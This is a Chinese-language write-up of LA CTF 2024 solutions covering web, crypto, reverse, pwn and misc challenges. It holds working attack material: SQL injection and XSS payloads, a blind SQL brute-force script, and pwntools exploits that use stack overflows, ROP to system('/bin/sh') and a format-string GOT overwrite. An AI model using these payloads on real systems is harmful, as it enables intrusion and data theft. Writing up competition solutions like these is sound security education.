# LA CTF 2024

## Web
### terms and conditions
![image](https://hackmd.io/_uploads/H1agE1W2p.png)
按鈕會移動 趁他不注意按下去就有 flag

`lactf{that_button_was_definitely_not_one_of_the_terms}`

### flaglang
::: spoiler app.js(/view)
```python
app.get('/view', (req, res) => {
  if (!req.query.country) {
    res.status(400).json({ err: 'please give a country' });
    return;
  }
  if (!countries.has(req.query.country)) {
    res.status(400).json({ err: 'please give a valid country' });
    return;
  }
  const country = countryData[req.query.country];
  const userISO = req.signedCookies.iso;
  if (country.deny.includes(userISO)) {
    res.status(400).json({ err: `${req.query.country} has an embargo on your country` });
    return;
  }
  res.status(200).json({ msg: country.msg, iso: country.iso });
});
```
:::
應該是作者沒寫好，只要不在 deny 的就行，不輸入 => None
直接輸入網址就有 flag
https://flaglang.chall.lac.tf/view?country=Flagistan


`lactf{n0rw3g7an_y4m7_f4ns_7n_sh4mbl3s}`

### la housing portal

:::spoiler `app.py`
```python
@app.route("/submit", methods=["POST"])
def search_roommates():
    data = request.form.copy()

    if len(data) > 6:
        return "Invalid form data", 422
    
    
    for k, v in list(data.items()):
        if v == 'na':
            data.pop(k)
        if (len(k) > 10 or len(v) > 50) and k != "name":
            return "Invalid form data", 422
        if "--" in k or "--" in v or "/*" in k or "/*" in v:
            return render_template("hacker.html")
        
    name = data.pop("name")

    
    roommates = get_matching_roommates(data)
    return render_template("results.html", users = roommates, name=name)
    

def get_matching_roommates(prefs: dict[str, str]):
    if len(prefs) == 0:
        return []
    query = """
    select * from users where {} LIMIT 25;
    """.format(
        " AND ".join(["{} = '{}'".format(k, v) for k, v in prefs.items()])
    )
    print(query)
    conn = sqlite3.connect('file:data.sqlite?mode=ro', uri=True)
    cursor = conn.cursor()
    cursor.execute(query)
    r = cursor.fetchall()
    cursor.close()
    return r
```
:::

這題有明顯的 sqli，但是要繞 waf，長度不能超過 50 且不能含有 `--` 或 `/*` 這種註解字串

由於不能有註解，因此必須要用 `'` 來結尾掉

而以下的 payload 恰巧 50 個字元，隨便塞在一個不是 `name` 的選項即可

```
' union select 1,flag,1,1,1,1 from flag where ''='
```

`lactf{us3_s4n1t1z3d_1npu7!!!}`

### pogn

在瀏覽器前端將 `mousemove` 的 eventlistener 覆蓋成下面這樣

```javascript
window.addEventListener('mousemove', (e) => {
  moved = true;
  const x = e.clientX;
  const y = e.clientY;
  userPaddle.style = `--x: ${x}px; --y: ${y}px`;
  userPos = viewportToServer([ x, y ]);
  v = [1e-307, 1e-307];
  p_x = x;
  p_y = y;
});
```

主要是改球移動的 vector 但我不知道發生什麼事，可能是後端數值計算上炸掉ㄌ

`lactf{7_supp0s3_y0u_g0t_b3773r_NaNaNaN}`

### new-housing-portal

在搜尋好友的地方有 XSS 漏洞 (由於 dom 渲染順序，需要用 iframe 的 srcdoc 來觸發)，不過 session 有 HTTP only

做一下 code review 可以看到當好友加你的時候可以看到對方的 secret，而 admin 的 secret 就是 flag

因此創建一個名子為下面的帳號及一個 `ywc2` 的帳號接收 secret

```!
<iframe srcdoc='<script>fetch("https://new-housing-portal.chall.lac.tf/finder", {body: "username=ywc2",method: "POST",headers: {"content-type": "application/x-www-form-urlencoded"}});</script>'></iframe>
```

將以下網址送給 admin 即可觸發

```!
https://new-housing-portal.chall.lac.tf/finder/?q=%3Ciframe%20srcdoc%3D%27%3Cscript%3Efetch(%22https%3A%2F%2Fnew-housing-portal.chall.lac.tf%2Ffinder%22%2C%20%7Bbody%3A%20%22username%3Dywc2%22%2Cmethod%3A%20%22POST%22%2Cheaders%3A%20%7B%22content-type%22%3A%20%22application%2Fx-www-form-urlencoded%22%7D%7D)%3B%3C%2Fscript%3E%27%3E%3C%2Fiframe%3E
```

`lactf{b4t_m0s7_0f_a77_y0u_4r3_my_h3r0}`

### penguin login
:::spoiler app.py
```python
...
flag = Path("/app/flag.txt").read_text().strip()

allowed_chars = set(string.ascii_letters + string.digits + " 'flag{a_word}'")
forbidden_strs = ["like"]

@cache
def get_database_connection():
    # Get database credentials from environment variables
    db_user = os.environ.get("POSTGRES_USER")
    db_password = os.environ.get("POSTGRES_PASSWORD")
    db_host = "db"

    # Establish a connection to the PostgreSQL database
    connection = psycopg2.connect(user=db_user, password=db_password, host=db_host)

    return connection

with app.app_context():
    conn = get_database_connection()
    create_sql = """
        DROP TABLE IF EXISTS penguins;
        CREATE TABLE IF NOT EXISTS penguins (
            name TEXT
        )
    """
    with conn.cursor() as curr:
        curr.execute(create_sql)
        curr.execute("SELECT COUNT(*) FROM penguins")
        if curr.fetchall()[0][0] == 0:
            curr.execute("INSERT INTO penguins (name) VALUES ('peng')")
            curr.execute("INSERT INTO penguins (name) VALUES ('emperor')")
            curr.execute("INSERT INTO penguins (name) VALUES ('%s')" % (flag))
        conn.commit()

@app.post("/submit")
def submit_form():
    conn = None
    try:
        username = request.form["username"]
        conn = get_database_connection()

        assert all(c in allowed_chars for c in username), "no character for u uwu"
        assert all(
            forbidden not in username.lower() for forbidden in forbidden_strs
        ), "no word for u uwu"

        with conn.cursor() as curr:
            curr.execute("SELECT * FROM penguins WHERE name = '%s'" % username)
            result = curr.fetchall()

        if len(result):
            return "We found a penguin!!!!!", 200
        return "No penguins sadg", 201

    except Exception as e:
        return f"Error: {str(e)}", 400

    # need to commit to avoid connection going bad in case of error
    finally:
        if conn is not None:
            conn.commit()

@app.get("/")
def index():
    #not important

if __name__ == "__main__":
    app.run(debug=True)
```
:::

重點 :
```python
            curr.execute("SELECT * FROM penguins WHERE name = '%s'" % username)
allowed_chars = set(string.ascii_letters + string.digits + " 'flag{a_word}'")
forbidden_strs = ["like"]
```

Postgres SQL Injection
`_` 可以當作 wildcard [Reference](https://www.postgresql.org/docs/current/functions-matching.html)
但是題目限制不能用 `LIKE` 所以要改用 `SIMILAR TO`

:::spoiler
```python
#!/usr/bin/python3.10

from requests import post
from string import ascii_letters as let, digits as dig

alpha = let + dig
url = "https://penguin.chall.lac.tf/submit"

def bf():
    flag = ""
    for j in range(45 - len(flag)):
        for c in alpha:
            data = {"username": "1' or name similar to '" + flag + c + "_" * (44 - len(flag))}
            r = post(url, data=data)
            if "We" in r.text:
                flag += c
                print(flag)
                break
        else:
            flag += "_"

bf()
```
:::

:::danger
被雷到的點 `{` 後面接 數字會被當 regex 所以一開始第一個字根本跑不出來
:::

`lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}`

## Crypto
### valentines-day
![image](https://hackmd.io/_uploads/rkZooyW36.png)

從非字母的地方可以推測他是 substitution 或是 vigenere
但是有說 key 長度 161

![image](https://hackmd.io/_uploads/B1fRo1Zn6.png)

Auto solve 之後會看到開頭大概就可以猜到後面的 key

### very hot
不會解一元三次式 Q_Q

![image](https://hackmd.io/_uploads/rkEp3yWnp.png)

### selamat pagi
純通靈 selamat pagi 是印尼語
他是 substitution cipher
搭配 Google Translate 大便題目 (

### hOlyT

:::spoiler `server.py`
```python
def crt(a, b, m, n):
    m1, n1 = xgcd(m, n)
    return ((b *m * m1 + a *n*n1) % (m * n))

def advice(x, p, q):
    if legendre(x, p) != 1:
        exit()
    if legendre(x, q) != 1:
        exit()
    x1 = tonelli(x, p) * random.choice([1, -1])
    x2 = tonelli(x, q) * random.choice([1, -1])
    y = crt(x1, x2, p, q)
    return y
    
def main():
    p = getPrime(1024)
    q = getPrime(1024)
    N = p * q
    e = 65537
    m = bytes_to_long(b"lactf{redacted?}")
    ct = pow(m, e, N)
    print(f"ct = {ct}")
    print(f"N = {N}")
    print(f"e = {e}")
    while 1:
        x = int(input("What do you want to ask? > "))
        ad = advice(x, p, q)
        print(ad)

if __name__ == "__main__":
    main()
```
:::

server 中的 `legendre` 和 `tonelli` 是求二次剩餘的函式，而 `xgcd` 是 extend gcd

整理一下式子我們可以看到他會將輸入算二次剩餘，之後先隨機乘正負 1 後計算一個 `(b *m * m1 + a *n*n1) % (m * n)` 的函式，這邊我不知道它是幹嘛的

不過由於在同一個連線的情況下，`m`, `m1`, `n`, `n1` 一定會是相同的，而更甚者當輸入相同時 `a`, `b` 的絕對值也一定會一樣，只會有正負號的隨機性而已

因此在同樣的輸入下，我們有 4 種狀態 `+a+b`, `-a+b`, `+a-b`, `-a-b`，而這邊我們就可以想得到 `+a+b` 和 `-a-b` 這兩個結果做相加時會彼此抵消為 0 (`-a+b` 和 `+a-b` 也是)，而當我們選 `+a+b` 和 `-a+b` 做相加時，會得到 `2b*m*m1` 的結果，可以看到結果裡有 N 的因子 `m`，而觀察其他的組合也會得到類似的結果，也就是有 N 的因子出現

因此，我們可以嘗試對兩個結果狀態相加與 N 做 GCD，預期就能得到 N 的因數，剩下的就是一般做 RSA 的解密流程而已

因此一開始我先用 1024 作為輸入取得 4 種狀態並儲存成 x1 ~ x4 這 4 個變數，再執行以下的腳本即可解密 flag

:::spoiler `solve.py`
```python
ct = ...
N = ...
e = ...
x1 = ...
x2 = ...
x3 = ...
x4 = ...

assert (x2 + x3) % N == 0
assert (x1 + x4) % N == 0

from sage.all import GCD
p = int(GCD((x1+x2) % N, N))
q = N // p

assert p*q == N

from Crypto.Util.number import long_to_bytes
phi = (p-1)*(q-1)
d = pow(e, -1, phi)
m = pow(ct, d, N)
print(long_to_bytes(m))
```
:::

`lactf{1s_r4bin_g0d?}`

## Reverse
### shattered-memories
strings
```
No, I definitely remember it being a different length...
t_what_f
t_means}
nd_forge
lactf{no
orgive_a
No, that definitely isn't it.
```

`lactf{not_what_forgive_and_forget_mean}`

### aplet321
![image](https://hackmd.io/_uploads/r1Eu90Z3a.png)

總結重點
- r12 計算 `pretty` 次數
- rbp 計算 `please` 次數
- $r12 + rbp = 54$
- $r12 - rbp = -24$
- `r12 = 15, rbp = 39`
- `flag` 要出現在 input

![image](https://hackmd.io/_uploads/HyUXfyMhp.png)

### flag-finder
此遊戲使用GameMaker製作，可用[UndertaleModTool](https://github.com/krzys-h/UndertaleModTool)對`data.win`進行解殼與反編譯，修改將鑰匙物件移至人物可移動之範圍即可。
![image](https://hackmd.io/_uploads/SyLtUIg3a.png)
![image](https://hackmd.io/_uploads/rJw3L8enp.png)
`lactf{k3y_to_my_h34rt}`

### glottem
:::spoiler glottem
```bash
#!/bin/sh
1<<4201337
1//1,"""
exit=process.exit;argv=process.argv.slice(1)/*
4201337
read -p "flag? " flag
node $0 "$flag" && python3 $0 "$flag" && echo correct || echo incorrect
1<<4201337
*///""";from sys import argv
alpha="abcdefghijklmnopqrstuvwxyz_"
d=0;s=argv[1];1//1;"""
/*"""
#*/for (let i = 0; i < s.length; i ++) {/*
for i in range(6,len(s)-2):
    #*/d=(d*31+s.charCodeAt(i))%93097;console.log(d)/*
    d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])];print("d=",d)#*/}
exit(+(d!=260,[d!=61343])[0])
4201337
```
:::

典型的 Polyglot 先拆成兩個檔案
```js
#!/bin/sh
alpha="abcdefghijklmnopqrstuvwxyz_"
d=0;s=argv[1];1//1;"""
for (let i = 0; i < s.length; i ++) {
    d=(d*31+s.charCodeAt(i))%93097;console.log(d)
}
```

```python
e = [...] # 26 * 27 * 27
alpha="abcdefghijklmnopqrstuvwxyz_"
d=0;s=argv[1]
for i in range(6,len(s)-2):
    d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])];print("d=",d)
exit(+(d!=260,[d!=61343])[0])
```

從 js 部分感覺應該只是拿來做驗證的 所以從 Python 下手
題目有說 flag 長度總共 34 表示 range 會 run 26 圈
同時要求要是 260 同時所以 list 最小值都是 10
所以直接檢查 10 分佈在 `e` 的位置

```python
# 透過字元 x 跟位置 y 確認下一個可能的自
func = (lambda x, y: ([f"{x+alpha[b]}" for b in range(27) if e[y][alpha.index(x)][b] == 10]))
```

接下來就是想辦法串接所有可能性後用兩邊 function 檢查結果
遞迴好難寫 (
:::spoiler Solve script
```python
#!/usr/bin/python3.10
from e import e

alpha = "abcdefghijklmnopqrstuvwxyz_"
func = (lambda x, y: ([f"{x+alpha[b]}" for b in range(27) if e[y][alpha.index(x)][b] == 10]))
arr = [[func(i, j) for i in alpha] for j in range(26)]
out = []

def test(s, ind):
    for i in arr[ind][alpha.index(s[-1])]:
        if i.startswith(s[-1]) and ind < 25:
            test(s[:-1]+i, ind+1)
    else:
        for i in func(s[-1], 25):
            if len(i):
                out.append(s+i[-1])

def calc(s):
    res = 0
    for i in s:
        res = (res * 31 + ord(i)) % 93097
    return res

def python_calc(s):
    d = 0
    for i in range(6, len(s)-2):
        d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])]
    return d

[test(i, 0) for i in alpha]
print(len(out))

for i in out:
    flag = f"lactf{{{i}}}"
    if calc(flag) == 61343 and python_calc(flag) == 260:
        print(flag)
        break
```
:::


## Pwn
### aplet123

:::spoiler `aplet123.c`
```clike
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

void print_flag(void) {
  char flag[256];
  FILE *flag_file = fopen("flag.txt", "r");
  fgets(flag, sizeof flag, flag_file);
  puts(flag);
}

const char *const responses[] = {...};

int main(void) {
  setbuf(stdout, NULL);
  srand(time(NULL));
  char input[64];
  puts("hello");
  while (1) {
    gets(input);
    char *s = strstr(input, "i'm");
    if (s) {
      printf("hi %s, i'm aplet123\n", s + 4);
    } else if (strcmp(input, "please give me the flag") == 0) {
      puts("i'll consider it");
      sleep(5);
      puts("no");
    } else if (strcmp(input, "bye") == 0) {
      puts("bye");
      break;
    } else {
      puts(responses[rand() % (sizeof responses / sizeof responses[0])]);
    }
  }
}
```
:::

```
[*] '/home/ywc/myworkspace/lactf2024/aplet123/aplet123'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
```

有開 canary 沒 PIE

gets 的地方有 bof 漏洞，可以先用 `strstr(input, "i'm")` 那邊偽造足夠長的字串再串上 `i'm` 的字串來 leak 後面的資料，也就能 leak canary

後面就是一般的 bof jump `print_flag`

:::spoiler `solve.py`
```python
from pwn import *
binary = "./aplet123"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("chall.lac.tf", 31123)
# conn = process(binary)
# conn = gdb.debug(binary, "b *0x00000000004012f8\n")

conn.sendlineafter(b"hello\n", b"A"*0x40 + b"i'm".rjust(0x8, b"A"))
conn.recvuntil(b"hi ")
canary = u64(conn.recvuntil(b"\x01, i'm", drop=True).rjust(0x8, b"\x00"))
print(f"canary: {hex(canary)}")

# 00000000004011e6   123 FUNC    GLOBAL DEFAULT   14 print_flag
printflag = 0x00000000004011e6
conn.sendlineafter(b"aplet123\n", b"A"*0x48 + p64(canary) + b"A"*0x8 + p64(printflag))

conn.sendline(b"bye")

conn.interactive()
```
:::

`lactf{so_untrue_ei2p1wfwh9np2gg6}`

### 52-card-monty

:::spoiler `monty.c`
```clike
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define DECK_SIZE 0x52
#define QUEEN 1111111111

void win() {
  char flag[256];

  FILE *flagfile = fopen("flag.txt", "r");

  if (flagfile == NULL) {
    puts("Cannot read flag.txt.");
  } else {
    fgets(flag, 256, flagfile);
    flag[strcspn(flag, "\n")] = '\0';
    puts(flag);
  }
}

void game() {
  int index;
  long leak;
  long cards[52] = {0};
  char name[20];

  for (int i = 0; i < 52; ++i) {
    cards[i] = lrand();
  }

  index = rand() % 52;
  cards[index] = QUEEN;

  printf("==============================\n");

  printf("index of your first peek? ");
  scanf("%d", &index);
  leak = cards[index % DECK_SIZE];
  cards[index % DECK_SIZE] = cards[0];
  cards[0] = leak;
  printf("Peek 1: %lu\n", cards[0]);

  printf("==============================\n");

  printf("index of your second peek? ");
  scanf("%d", &index);
  leak = cards[index % DECK_SIZE];
  cards[index % DECK_SIZE] = cards[0];
  cards[0] = leak;
  printf("Peek 2: %lu\n", cards[0]);

  printf("==============================\n");

  printf("Show me the lady! ");
  scanf("%d", &index);

  printf("==============================\n");

  if (cards[index] == QUEEN) {
    printf("You win!\n");
  } else {
    printf("Just missed. Try again.\n");
  }

  printf("==============================\n");

  printf("Add your name to the leaderboard.\n");
  getchar();
  printf("Name: ");
  fgets(name, 52, stdin);

  printf("==============================\n");

  printf("Thanks for playing, %s!\n", name);
}

int main() {
  setup();
  printf("Welcome to 52-card monty!\n");
  printf("The rules of the game are simple. You are trying to guess which card "
         "is correct. You get two peeks. Show me the lady!\n");
  game();
  return 0;
}
```
:::

```
[*] '/home/ywc/myworkspace/lactf2024/52_card_monty/monty'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保護全開

```clike
scanf("%d", &index);
leak = cards[index % DECK_SIZE]
```

DECK_SIZE 是 0x52 而不是 52，有 oob 漏洞，可以讀取到 canary 及 return address 來破解 canary 及 PIE

```clike
printf("Name: ");
fgets(name, 52, stdin);
```

由於 name 長度是 20，而這邊可以輸入 52 個字元，有 bof 漏洞

我們可以先用兩次的 leak 得到 canary 和 code base 之後，在猜 queen 那邊隨便猜不影響，而最後輸入名字那邊就能正常 bof 跳 `win` 拿 flag

:::spoiler `solve.py`
```python
from pwn import *
binary = "./monty"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("chall.lac.tf", 31132)
# conn = process(binary)
# conn = gdb.debug(binary)

conn.sendlineafter(b"peek? ", b"55")
conn.recvuntil(b"Peek 1: ")
canary = int(conn.recvline().strip().decode())
print(f"Canary: {hex(canary)}")

conn.sendlineafter(b"peek? ", b"57")
conn.recvuntil(b"Peek 2: ")
leak = int(conn.recvline().strip().decode())
codebase = leak - 0x167e
print(f"codebase: {hex(codebase)}")

#  68: 0000000000001239   171 FUNC    GLOBAL DEFAULT   14 win
win = codebase + 0x1239
conn.sendlineafter(b"lady! ", b"0")

conn.sendlineafter(b"Name: ", b"A"*0x18 + p64(canary) + b"B"*8 + p64(win))

conn.interactive()
```
:::

`lactf{m0n7y_533_m0n7y_d0}`

### sus

:::spoiler `sus.c`
```clike
#include <stdio.h>

void sus(long s) {}

int main(void) {
  setbuf(stdout, NULL);
  long u = 69;
  puts("sus?");
  char buf[42];
  gets(buf);
  sus(u);
}
```
:::

```
[*] '/home/ywc/myworkspace/lactf2024/sus/sus'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

沒有 pie 和 canary

這題很明顯的有 bof 漏洞，不過沒有 win 函式，需要 ret2libc 開 shell

要 leak libc 位置可以使用 `deregister_tm_clone` 來 leak，libc 中位置就會在 rax 的地方，再透過 puts 印出來即可

後面就是一般的 ret2libc，不過搞 libc 的問題搞很久，總之現在知道 `redpwn/jail` 的 libc 通常會在 `/srv` 起始的路徑下

:::spoiler `solve.py`
```python
from pwn import *
binary = "./sus_old"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("chall.lac.tf", 31284)
# conn = process(binary)
# conn = gdb.debug(binary)

# 4010A0 deregister_tm_clones
# .text:000000000040117C                 mov     rdi, rax        ; s
# .text:000000000040117F                 call    _puts
# 0x0000000000401016 : ret
dtm_clone = 0x4010A0
ret = 0x401016
bss = 0x404028

chain = flat([
    dtm_clone,
    0x40117C,
])
conn.sendlineafter(b"sus?\n", b"A"*0x40 + p64(bss+0x900) + chain)
leak = u64(conn.recvline().strip().ljust(8, b"\x00"))
print(f"Leak: {hex(leak)}")
libcbase = leak - 0x1d3760
print(f"Libc base: {hex(libcbase)}")

input("next?")

# 0x0000000000196031 : /bin/sh
#  000000000004c490    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
# 0x00000000000277e5 : pop rdi ; ret
binsh = libcbase + 0x196031
system = libcbase + 0x4c490
pop_rdi = libcbase + 0x277e5

chain = flat([
    pop_rdi,
    binsh,
    system,
])
conn.sendline(b"A"*0x40 + p64(0xdeadbeef) + chain)

conn.interactive()
```
:::

`lactf{amongsus_aek7d2hqhgj29v21}`

### pizza

:::spoiler `pizza.c`
```clike
#include <stdio.h>
#include <string.h>

const char *available_toppings[] = {...};

const int num_available_toppings =
    sizeof(available_toppings) / sizeof(available_toppings[0]);

int main(void) {
  setbuf(stdout, NULL);
  printf("Welcome to kaiphait's pizza shop!\n");
  while (1) {
    printf("Which toppings would you like on your pizza?\n");
    for (int i = 0; i < num_available_toppings; ++i) {
      printf("%d. %s\n", i, available_toppings[i]);
    }
    printf("%d. custom\n", num_available_toppings);
    char toppings[3][100];
    for (int i = 0; i < 3; ++i) {
      printf("> ");
      int choice;
      scanf("%d", &choice);
      if (choice < 0 || choice > num_available_toppings) {
        printf("Invalid topping");
        return 1;
      }
      if (choice == num_available_toppings) {
        printf("Enter custom topping: ");
        scanf(" %99[^\n]", toppings[i]);
      } else {
        strcpy(toppings[i], available_toppings[choice]);
      }
    }
    printf("Here are the toppings that you chose:\n");
    for (int i = 0; i < 3; ++i) {
      printf(toppings[i]);
      printf("\n");
    }
    printf("Your pizza will be ready soon.\n");
    printf("Order another pizza? (y/n): ");
    char c;
    scanf(" %c", &c);
    if (c != 'y') {
      break;
    }
  }
}
```
:::

```
[*] '/home/ywc/myworkspace/lactf2024/pizza/pizza'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

沒開 canary 但有 PIE

這題的漏洞如下，我們可以透過自訂選料控制 toppings，而也就可以在這邊控 printf 的第一個參數，也就是 fmt attack，可以做 oob read/write

```clike
printf(toppings[i]);
printf("\n");
```

我們可以先 leak 出 libc 及 code base，得出 system 以及 printf 的 got 位置，我們就能夠修改 printf 的 got 成 system，即可在呼叫 printf 時變成呼叫 system，再帶入 `/bin/sh` 字串即可開 shell

:::spoiler `solve.py`
```python
from pwn import *
binary = "./pizza"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("chall.lac.tf", 31134)
# conn = process(binary)
# conn = gdb.debug(binary)

# 4010A0 deregister_tm_clones
# .text:000000000040117C                 mov     rdi, rax        ; s
# .text:000000000040117F                 call    _puts
# 0x0000000000401016 : ret

conn.sendlineafter(b"> ", b"12")
conn.sendlineafter(b"topping: ", b"%47$p|%49$p|")
conn.sendlineafter(b"> ", b"1")
conn.sendlineafter(b"> ", b"1")
conn.recvuntil(b"chose:\n0x")
libc_leak = int(conn.recvuntil(b"|", drop=True), 16)
code_leak = int(conn.recvuntil(b"|", drop=True), 16)
libcbase = libc_leak - 0x2718a - 0xc0
codebase = code_leak - 0x1189
print(f"libcbase: {hex(libcbase)}")
print(f"codebase: {hex(codebase)}")

conn.sendlineafter(b"n): ", b"y")

#  000000000004c490    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
# 0x104020 printf.got
system = libcbase + 0x4c490
printf_got = codebase + 0x4020

fmt = fmtstr_split(7, {printf_got: system}, write_size="short")
conn.sendlineafter(b"> ", b"12")
conn.sendlineafter(b"topping: ", b"A"*8+ fmt[1])
conn.sendlineafter(b"> ", b"12")
conn.sendlineafter(b"topping: ", fmt[0])
conn.sendlineafter(b"> ", b"12")
conn.sendlineafter(b"topping: ", b"/bin/sh\x00")

conn.interactive()
```
:::

`lactf{golf_balls_taste_great_2tscx63xm3ndvycw}`

## Misc
### infinite loop
![image](https://hackmd.io/_uploads/ry8t_yWna.png)

直接從前端搜尋
`lactf{l34k1ng_4h3_f04mz_s3cr3tz}`

### mixed signals
[NATO phonetic](https://en.wikipedia.org/wiki/NATO_phonetic_alphabet)

只聽第一個字母就好

### one by one

[ref](https://theconfuzedsourcecode.wordpress.com/2019/12/15/programmatically-access-your-complete-google-forms-skeleton/)

工人智慧 + ctrl-f 從結尾的 122 id -> 119 id -> 115 id -> 111 id -> ... 找到對應的 char

`lactf{1_by_0n3_by3_un0_*,"g1'}`

### closed

找`Shorebirds nesting on rocks STATE PARK california`

![image](https://hackmd.io/_uploads/r1Cv8Qk36.png)

[翻了一下美國護鳥協會，海岸邊主要保護 Shorebrid 都在這](https://www.montereyaudubon.org/shorebirds)

近岸邊的都放大看一遍

![image](https://hackmd.io/_uploads/S1O1Dmk2a.png)

`(36.515520, -121.949320)`
![image](https://hackmd.io/_uploads/rJagw713a.png)

`lactf{36.516,-121.949}`

### gacha
:::spoiler package.sh
```bash
#!/bin/sh
dd if=/dev/urandom ibs=1 count=128 > secret.key
rm -rf chall
mkdir -p chall
cp img/fiscl.png chall/

# add flag to uwu
magick img/uwu.png \
    -weight 50000 -fill red -pointsize 96 \
    -draw "text 50,540 '`cat flag.txt`'" \
    PNG24:flag.png

magick img/owo.png -encipher secret.key chall/owo.png
magick flag.png -encipher secret.key chall/uwu.png
rm flag.png

rm -f chall.zip
zip -9r chall.zip chall/
```
:::

看都沒看 code 直接猜 Image XOR
最後用 stegsolve 的 image combiner xor `uwu` `owo` 就好

![image](https://hackmd.io/_uploads/rkJ6agWha.png)
![image](https://hackmd.io/_uploads/B1v9px-2p.png)

## Welcome
### discord

`lactf{i'm_in_the_discord_server!}`

### Rules

`lactf{i_read_the_rules}`